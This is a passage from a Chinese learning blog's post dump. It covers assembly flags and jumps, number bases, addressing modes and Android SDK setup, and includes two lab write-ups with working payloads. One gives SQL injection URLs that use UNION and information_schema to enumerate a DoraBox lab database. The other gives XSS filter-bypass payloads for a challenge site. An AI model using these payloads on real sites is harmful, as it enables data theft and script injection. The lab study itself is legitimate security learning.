总结：学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记）也熟悉了函数是如何嵌套调用的。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"JCC学习","slug":"JCC","date":"2019-10-07T15:09:50.000Z","updated":"2020-02-28T07:53:54.000Z","comments":true,"path":"2019/10/07/JCC/","link":"","permalink":"http://chumen77.xyz/2019/10/07/JCC/","excerpt":"","text":"JCC学习JCC指令集合详细__1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、JS 结果为负则跳转 SF=1 4、JNS 结果为非负则跳转 SF=0 5、JP, JPE 结果中1的个数为偶数则跳转 PF=1 6、JNP, JPO 结果中1的个数为偶数则跳转 PF=0 7、JO 结果溢出了则跳转 OF=1 8、JNO 结果没有溢出则跳转 OF=0 9、JB, JNAE 小于则跳转 (无符号数) CF=1 10、JNB, JAE 大于等于则跳转 (无符号数) CF=0 11、JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 12、JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 13、JL, JNGE 小于则跳转 (有符号数) SF≠ OF 14、JNL, JGE 大于等于则跳转 (有符号数) SF=OF 15、JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF 16、JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF 表格总结 直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要注意那些有符号的JCC跳转指令，因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。 注意：JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的 练习使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.前提：能用CMP和TEST实现的优先考虑. 1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1MOV AL,1 MOV CL,1 CMP AL,CL JE 0X0040102B2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0MOV AL,1 TEST AL,AL JNZ 0X004010063、 JS 结果为负则跳转 SF=1MOV AL,1 MOV CL,2 CMP AL,CL4、 JNS 结果为非负则跳转 SF=0XOR EAX,EAX JNS 0X0040102F5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1MOV AL,2 MOV CL,2 CMP AL,CL JPE 0X004010086、JNP, JPO 结果中1的个数为奇数则跳转 PF=0MOV AL,2 MOV CL,1 CMP AL,CL JPE 0X004010087、 JO 结果溢出了则跳转 OF=1MOV AL,80 SUB AL,10 JO 0X004010088、 JNO 结果没有溢出则跳转 OF=0MOV AX,0FFFF ADD AX,80 JNO 0X004010109、 JB, JNAE 小于则跳转 (无符号数) CF=1MOV AX,80 MOV CX,90 CMP AX,CX JB 0X0040103E10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0MOV AX,80 MOV CX,90 CMP CX,AX JB 0X0040104411、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。 MOV AL,1 MOV CL,1 CMP AL,CL JE 0X0040102B或者 MOV AX,80 MOV CX,90 CMP AX,CX JB 0X0040103E12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0MOV AX,80 MOV CX,90 CMP CX,AX JB 0X00401044解析： 这个与练习10的区别就是不可以让两个数相等。 13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OFMOV AL,0XFF MOV CL,0X01 CMP AL,CL JB 0X00401063 JL 0X00401063解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！ 比如这个练习用到了JL,FF就是-1了，那么-1&lt;1这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。 14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OFMOV AL,1 MOV CL,0CC CMP AL,CL JGE 0X0040108B15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OFMOV AL,1 MOV CL,0CC CMP CL,AL JGE 0X0040108B这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，这两个操作数只能是相同的数，没什么看不看做有无符号的说法。 16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OFMOV AX,1 MOV CX,FF CMP AX,CX JG 0x004010A6 MOV AL,1 MOV CL,0FF CMP AL,CL JG 0x004010A6解析： 判断一下，第1段代码对还是第2段代码对？ 在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，且一定要注意下数据宽度。在这个例子中，第一段代码是无法实现JG跳转的，因为其数据宽度的问题，影响到SF,所以其没办法SF=OF就没法跳转。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"标志寄存器","slug":"标志寄存器","date":"2019-10-06T14:01:14.000Z","updated":"2020-02-28T07:54:01.000Z","comments":true,"path":"2019/10/06/标志寄存器/","link":"","permalink":"http://chumen77.xyz/2019/10/06/标志寄存器/","excerpt":"","text":"标志寄存器部分标志寄存器详细介绍需要先熟练记住这几个寄存器的位置和名称：CF PF AF ZF SF OF CF进位标志CF(Carry Flag):如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 解析：在看运算结果的时候，先提前确定好参与运算的数是有无符号数和它们的数据宽度。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。 PF奇偶标志PF(Parity Flag)：PF标志位，根据结果中最低有效字节(最低8位)中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。 AF辅助进位标志AF(Auxiliary Carry Flag)：如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。—-（维基百科） 辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。—（百度百科） 解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是在D0-D7中，D3向D4位进位或者借位，才会置1。（这个当初老师讲错、百度高赞也是错的，要注意一下）。 ZF零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。解析：引一下常用的xor r8/16/32,r8/16/32对寄存器清零操作。 SF符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把它换成2进制确定最高位是0还是1.例子： MOV AL,20 MOV CX,8000 ADD AX,CX这个就是在字上操作，然后相加结果是8020,最高位就是1000，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。 OF溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。 CF与SF区别： 进位标志表示无符号数运算结果是否超出范围. 溢出标志表示有符号数运算结果是否超出范围. 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律： 正 + 正 = 正 如果结果是负数，则说明有溢出 负 + 负 = 负 如果结果是正数，则说明有溢出 正 + 负 永远都不会有溢出.结合这个图在应为对PF的判断，非常好用。判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。 练习写汇编指令只影响CF位的值MOV AL,0FE ADD AL,10 写汇编指令只影响PF位的值MOV AL,1 ADD AL,2 写汇编指令只影响AF位的值MOV EAX,0F ADD EAX,1 写汇编指令只影响SF位的值MOV CL,0F1 ADD CL,1 写汇编指令只影响OF位的值MOV AL,80 SUB AL,10 这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，站在80的位置顺时针查10，负-正=正，来实现溢出完成只影响OF位。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"数据宽度与逻辑运算","slug":"数据宽度与逻辑运算","date":"2019-10-01T13:08:32.000Z","updated":"2020-02-24T04:28:05.000Z","comments":true,"path":"2019/10/01/数据宽度与逻辑运算/","link":"","permalink":"http://chumen77.xyz/2019/10/01/数据宽度与逻辑运算/","excerpt":"","text":"数据宽度与逻辑运算数据宽度数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。 对数据宽度的理解和有无符号数4位宽度表示4位宽度表示：假设计算机只能存储4位2进制数： 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 0 1 2 3 4 5 6 7 8 9 A B C D E F 存无符号数时：0 1 2 3 4 5 6 7 8 9 A B C D E F存有符号数时： 正数：0 1 2 3 4 5 6 7 负数：-1 -2 -3 -4 -5 -6 -7 -8 其中对应关系： -1 -2 -3 -4 -5 -6 -7 -8 F E D C B A 9 8 无符号数时：从0到F逆时针依次增大。 有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。 为什么在存有符号数时说开头为1的数就是负数？我们只看二进制：| 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || — | — | — | — | — | — | — | — | — || 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 | -1 -2 -3 -4 -5 -6 -7 -8 1111 1110 1101 1100 1011 1010 1001 1000 很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。 举例：对1011的理解 1011在我们当做是有符号时就是-5，无符号就是B。这个完全看我们如何去定义。 #### 8位宽度： 8位宽度表示：假设计算机只能存储8位2进制数。 无符号数：0 1 2 3 4 ……FF 有符号数：正数：0 1 2 3 4 5 6 7 …7F负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FF FE FD FC FB FA F9 F8 …. 80 16位宽度16位宽度表示：假设计算机只能存储16位2进制数无符号数：0 1 2 3 4 ……FFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFF FFFE FFFD FFFC FFFB FFFA FFF9 FFF8 …. 8000 32位宽度32位宽度表示：假设计算机只能存储32位2进制数无符号数：0 1 2 3 4 ……FFFFFFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFFFFFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFFFFFF FFFFFFFE FFFFFFFD FFFFFFFC FFFFFFFB FFFFFFFA FFFFFFF9 FFFFFFF8 …. 80000000 ### 几个本质问题 1：计算机除了0和1什么也不认识。 2：如果存的数据超过数据长度限制，超过的会直接抛弃。 3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。 ### 几个重要的计量单位： BYTE 字节 8BIT WORD 字 16BIT 2字节 DWORD 双字 32BIT 4字节 逻辑运算二进制的逻辑运算：or：或(or |) 只要有一个为1就是1 and：与(and &amp;)两个都为1才是1 xor异或（xor) 不一样为1ps：错位了。。。 not非(not !) 1是0 0是1 逻辑运算的具体应用：想获取某个值得第N位的值是1还是0如：8F 方法：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。 最简单的加密算法：如：要加密的数据：2015密钥：54因为密钥是两位的，所以要对2015分为20和15。进行一次xor运算，出来就是加密后的值：74 41当用他俩再进行一次xor运算：就又变成了2015。这就完成了加密解密。","categories":[],"tags":[]},{"title":"进制学习","slug":"进制学习","date":"2019-09-28T03:52:16.000Z","updated":"2019-10-17T16:01:09.000Z","comments":true,"path":"2019/09/28/进制学习/","link":"","permalink":"http://chumen77.xyz/2019/09/28/进制学习/","excerpt":"","text":"进制学习进制的定义十进制的定义:由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9逢十进一。 九进制的定义:由九个符号组成，分别是0 1 2 3 4 5 6 7 8逢九进一。 十六进制的定义:由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F 进制的本质例如十进制：0 1 2 3 4 5 6 7 8 9 其就是由10个符号组成。如果定义其为9 1 5 2 4 7 6 3 8 0,或者换成,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。 二进制与十六进制的映射关系这个需要背会。 练习正常认知的进制：二进制从0写到100 七进制编制7进制加法表，乘法表，并计算下面的结果：23456+54356=？5621-654=？234*65=？7进制加法表：7进制乘法表：粗略计算过程：本质就是直接查表了。 十六进制：编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？16进制加法：16进制乘法表：粗略计算过程： 都是查表。 面向本质的非认知进制：一：9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1 计算：123 + 234 = ? 先画个进制表：然后计算： 解题过程:1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725 二：10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1 计算：@$$B + %AC&amp; = ? 先画个进制表：然后计算： 解题过程：1)最后一位B+&amp;中的&amp;是第5个数，所以B+&amp;可以看成从B向后数5个为@%，取最后一个%且有一个进位2)最后第二位$+C中的C是第9个数，所以$+C相当从$开始查9个数，前面有一个进位，需要再向后查一个是@$，取最后一位$且进1位3)最后第三位$+A中的A是第7个数，所以$+A相当于从$开始往后查7个，有一个进位，要再向后查一个，再查一位是@!，所以最后是!且进一位4)第一位的@+%中的@是第一个数，所以@+%相当于从%在往后查一位，因为有个进位所以再往后查一位就是&amp;。所以答案就是&amp;!$%。 总结：经过这次对进制的学习和练习，对进制理解更加的深刻，它们只是一堆符号，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。","categories":[],"tags":[]},{"title":"逆向学习-滴水公开课","slug":"逆向学习-滴水公开课","date":"2019-09-27T15:14:39.000Z","updated":"2019-10-17T15:45:30.000Z","comments":true,"path":"2019/09/27/逆向学习-滴水公开课/","link":"","permalink":"http://chumen77.xyz/2019/09/27/逆向学习-滴水公开课/","excerpt":"","text":"逆向学习-滴水公开课知识总结一、内存的读写寻址公式一: [立即数]读取内存的值: MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DYVORD PTR DS:[0x13FFC8] 向内存中写入数据: MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8].ebx 获取内存编号: LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] 寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] 寻址公式三: [reg+立即数]读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC].0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] 寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4] 寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] 二、堆栈变形的艺术:push eax代码相当于:lea esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],eax 或者 mov dword ptr ss:[esp-4],eax lea esp,dword ptr ss:[esp-4] 还有 sub esp,0x4 mov dword ptr ss:[esp],eax push esp代码相当于：mov dword ptr [esp-4],esp sub esp,0x4 还有： mov dword ptr [esp-4],esp lea esp,dword ptr [esp-4] pop eax 代码相当于：lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4] mov eax,dword ptr [esp] lea esp,dword ptr [esp+4] pop esp 代码相当于：add esp,0x4 mov esp,dword ptr[esp-4]或者 lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4] 两条简单指令stos ：将eax中的值放入edi所指地址的内存里。 rep ：是重复指令 ecx中放入重复的次数","categories":[],"tags":[]},{"title":"安卓程序分析环境搭建","slug":"安卓程序分析环境搭建","date":"2019-09-23T09:22:24.000Z","updated":"2019-10-17T15:45:31.000Z","comments":true,"path":"2019/09/23/安卓程序分析环境搭建/","link":"","permalink":"http://chumen77.xyz/2019/09/23/安卓程序分析环境搭建/","excerpt":"","text":"#安卓程序分析环境搭建 Mac下安卓SDK搭建：前提是已经安装了homebrew神器： 1：下载SDKbrew search android-sdk brew cask install android-sdk2：配置环境变量vim .zshrc export ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot; export PATH=&quot;${PATH}:${ANDROID_SDK_ROOT}/tools:${ANDROID_SDK_ROOT}/platform-tools&quot;!wq退出以后，source ~/.zshrc pwd /usr/local/share/android-sdk/tools/bin ./sdkmanager然后会出现Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.继续touch /Users/gjy/.android/repositories.cfg 3：检验是否搭建好在终端输入：android这就ok了。 安卓NDK搭建前提是已经安装了homebrew神器： 1：下载NDK：brew search android-ndk brew cask install android-ndk2：配置环境变量：vim .zshrc export ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot; //添加进去正常保存退出 source .zshrc3：检验：ndk-build已经成功了。","categories":[],"tags":[]},{"title":"SQL注入基础学习","slug":"SQL基础学习","date":"2019-09-01T11:17:25.000Z","updated":"2020-02-28T07:54:19.000Z","comments":true,"path":"2019/09/01/SQL基础学习/","link":"","permalink":"http://chumen77.xyz/2019/09/01/SQL基础学习/","excerpt":"","text":"SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。 使用符号测试 单引号 减号 数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符型的注入较少，补充一下原理： 我们先进行正常查询：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit当我们给接受处加&#39;：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit语句执行后，会产生报错：然后我们想办法不让其报错，就是来省略后面那个php代码语句加的&#39;: 用#来注释，但需要进行url来转变一下为%23 用--+ --%20来注释然后就可以来用and or xor like来测试了，例如：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submithttp://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit union知识小记union在集合两个select查询语句时，一定要注意两个查询出来的结果,列数（columns）要相等才会出来结果。例如：SELECT * from news union SELECT 1,2;报错，换成SELECT * from news union SELECT 1,2,3; order by 知识小记order by是按照一定规则来进行排序的语句。我们为什么能够通过order by排序，来排出来列名有多少个呢？我们来测试一下： SELECT * from test ORDER BY 1;当我们在测试到SELECT * from test ORDER BY 5;发现出了异常。我们换个3列的表：`SELECT * from newsORDER BY 3;`显示是正常的`SELECT * from newsORDER BY 4;`所以可以发现我们在order by后加数字可以来测出来一个表的列名个数。 显示联合查询出现的结果显示我们自定义查询的结果，该怎么实现呢。先在靶场测试：SELECT * FROM news WHERE id = 2 union select 1,2,3 from test 明显网页是不给显示的。相同语句在数据库：不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：SELECT * FROM news WHERE id = -1发现是不显示东西的。继续测试:SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;接着我们拿到靶场测试： 达到我们的目的了。看这个页面显示的效果2 3，反向思维考虑把2 3改成我们的列名是不是就可以出数据了，但是我们如何知道表里的列名呢？ exists（）函数小记exists()是验证某个语句是否存在结果，是个bool函数，存在显示1反之是0。SELECT * FROM news WHERE id=1 and exists(select * from test);在数据库进行测试:SELECT * FROM news WHERE id=1 and exists(select * from aa);发现在用这个函数查不存在的表的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，可以通过burpsuit来跑。还有意外收获，可以看出数据库的名字pentest就是数据库的名字了。 数据类型（搜索型）%的作用%在mysql中表示通配符。在SQL语句中:******* like &#39;%a&#39;，就是搜索返回以字母a结尾的所有信息，同理a%%a%``,分别就是 搜索返回以字母a开头的所有信息和搜索返回包含字母a的所有信息。 如何注入咱们先看下php源代码:$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search很明显提前闭合&#39;%跟省略后面的%&#39;就可以了，所以http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit 然后我们正常走步骤，利用order by来确定下多少列：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit继续http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit可以确定是3列了。 然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：先正常构造payload：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit确定news表名存在，然后开始用burp跑其他的：我们是跑表名，所以在news加上变量。这个步骤需要先点然后在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。然后我们开始看结果Render下面显示正常就证明是存在的。这个是不存在。最终用这个办法可以跑出表名test、account。同样办法跑列名： 确定出news表中有id、title、content等列。 然后我们更新下语句来查表和列，exists()这个办法是有点老的比较笨。在MySQL&gt;5.1版本中，我们可以在information_schema发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：第一步，我们先让其可以显示我们想查询的内容http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit把标题下的2换成darabase()函数，来显示下数据库的名字。http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit然后我们就的得到了pentest，然后开始利用这个mysql&gt;5.1特性来构造语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit但是在这里面怎么显示其他的名字呢？继续:http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit其中可以将!=换成&lt;&gt;是同样的效果。继续在语句中加and和不等于前面查出的表的名字：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了group_cancat()函数：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit 然后我们继续去查列名，然后转到infromation_schema的columns下，一直搜索account下滑发现，我们在这个列表下可以拿到更全的信息： 去对比下account表下的列名信息：是相对应的，所以我们可以更改下语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿news测试下获取列名：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chumen77.xyz/tags/SQL/"}]},{"title":"XSS挑战之旅","slug":"XSS挑战之旅","date":"2019-08-20T12:29:45.000Z","updated":"2020-02-28T07:54:30.000Z","comments":true,"path":"2019/08/20/XSS挑战之旅/","link":"","permalink":"http://chumen77.xyz/2019/08/20/XSS挑战之旅/","excerpt":"","text":"XSS挑战之旅关卡第一关payload:&lt;script&gt;alert(1)&lt;/script&gt;此题没有任何过滤，直接构造语句，在标签之间进行输出。 第二关此题变成了&lt;input&gt;标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;， 或者也可以payload：&quot; onclick=alert(1)&gt;这个需要点击搜索后，再点击搜索框，属于借助js事件类型。 第三关变成了单引号的input标签，先尝试闭合input标签这个思路。发现没有过去，去看下网页代码。发现其过滤了&lt; &gt;,这样只能通过js事件来构造弹窗。跟上题一样，不过此处是单引号，所以构造payload：&#39; onclick=&#39;alert(1)注意此处的alert(1)的前面还有个单引号，其效果就是value=&#39;&#39; onclick=&#39;alert(1)&#39; 第四关查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：&quot; onclick=&quot;alert(1) 第五关看网页源代码，跟上题一样，直接先测试上题的payload。&lt;input name=keyword value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看&lt; &gt;是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。payload=&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;然后点击就ok了。 第六关第六关直接测试上题的payload，无法通过，然后看网页源代码：&lt;input name=keyword value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;发现href遭到了过滤，结果发现改变大小写可以绕过。payload：&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; 第七关还是先测试上题的payload，然后查看源代码，发现：href与script直接被替换成了空，然后考虑双写绕过，构造payload：&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt; 第八关发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。会发现这个题是在这个地方来进行xss攻击。先构造payload：javascript:alert(1)，无法通过，然后查看源代码&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。构造payload：javasc&amp;#114;ipt:alert(1) 第九关这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，http://www.baidu.com,发现显示正常了，经过测试后发现其在检测到http://后才会正常显示你的代码。所以构造payload：javasc&amp;#114;ipt:alert(1)//http://注意”//“这个是来注释后面的代码的。 第十关进来以后发现无任何可输入的地方，然后就查看源代码 发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到type=”***“，即可把原来的type给替换所以考虑构造payload：&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()然后会出现个输入框，点击后即可过关。此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个name=&quot;t_sort&quot;才会出现文本框，所以构造了以最后一个标签为攻击点的payload。 第十一关至第十三关这几关都是http头注入需要抓包来完成，基本大差不差的。第十一关 Referer第十二关 ua 第十三关 cookie明显是cookie注入了 第十四至最后这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。 绕过姿势小补充“()”被过滤用” ` “ 字符了来代替括号。 payload: alert`1` 小进阶 “ ` “ “()”同时被过滤可以使用 &lt;svg&gt; 